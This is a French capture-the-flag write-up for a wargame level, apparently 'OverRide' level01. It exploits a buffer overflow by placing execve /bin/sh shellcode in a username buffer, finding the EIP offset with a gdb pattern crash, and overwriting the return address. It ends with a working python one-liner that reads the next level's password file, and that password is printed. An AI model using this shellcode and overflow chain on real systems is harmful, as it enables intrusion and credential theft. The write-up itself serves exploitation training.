### level01

Dans ce code, nous retrouvons donc 2 variables qui sont remplies par l'utilisateur :

```c
char username[256];
char password[100];
```

L'objectif va être de remplir la première avec un code que nous allons injecter, puis de rediriger le flot d'exécution en écrasant eip afin de le guider vers le code injecté.
La fonction que nous allons injecter est un execve avec le code suivant :

```bash
    dat_will\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Afin de passer à la suite, il faut que l'utilisateur commence par ``dat_wil``, sinon le programme s'arrête.

Il ne nous reste plus qu'à chercher l'offset requis afin de provoquer un débordement depuis le mot de passe.

```bash
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) i r
eax            0x1	1
ecx            0xffffffff	-1
edx            0xf7fd08b8	-134412104
ebx            0x33634132	862142770
esp            0xffffd710	0xffffd710
ebp            0x63413563	0x63413563
esi            0x0	0
edi            0x41346341	1093952321
eip            0x37634136	0x37634136
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

Si nous prenons la valeur de eip ( ``0x37634136``) nous avons donc un offset de 80.
Il ne nous reste plus qu'à trouver l'adresse du début de notre injection afin de l'exécuter.
Elle est donc stockée 8 bits plus loin que le début de username.

avec un objdump nous retrouvons ceci
```bash
0804a040 g     O .bss	00000064              a_user_name
```

L'adresse de dat_will sera donc de 7 cases plus loin, soit en ``0x804a047``.

Il ne nous reste plus qu'à exécuter avec cette commande finale :

```bash
(python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; python -c 'print "cat /home/users/level02/.pass"') | ./level01
```

```bash
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; python -c 'print "cat /home/users/level02/.pass"') | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
